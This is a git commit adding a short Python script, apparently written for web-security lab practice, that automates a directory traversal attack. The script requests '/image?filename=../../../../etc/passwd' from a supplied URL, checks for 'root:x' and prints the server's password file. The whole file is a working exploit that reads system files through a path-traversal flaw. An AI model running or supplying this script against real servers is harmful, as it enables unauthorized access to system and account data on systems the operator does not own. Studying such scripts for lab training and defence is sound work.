68c9dab9e39e5d38ccba18dfdb1bc9d362f892f4
IniRud <62637456+IniRud@users.noreply.github.com>
2024-07-31 08:11:43 -0600

    Create directorytraversal2.py
    Directory Traversal Automation Test

---
+++ directorytraversal2.py
@@ -0,0 +1,30 @@
+import sys
+import requests
+import urllib3
+#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestsWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http:127.0.0.1:8080'}
+
+def directory_traversal_exploit(url):
+    image_url = url + '/image?filename=../../../../etc/passwd'
+    r = requests.get(image_url)
+    if 'root:x' in r.text:
+        print('(+) exploit was succesful')
+        print('(+) The following is the content of the etc/passwd file:')
+        print(r.text)
+    else:
+        print('(+) Exploit failes')
+        sys.exit(-1)
+
+def main():
+    if len(sys.argv) !=2:
+        print("[+] Usage: %s <url>" % sys.argv[0])
+        print("[+] Example: %s www.example.com" % sys.argv[0])
+        sys.exit(-1)
+    
+    url = sys.argv[1]
+    print("(+) Exploiting the directory vulnerability")
+    directory_traversal_exploit(url)
+
+if __name__ == "__main__":
+    main()
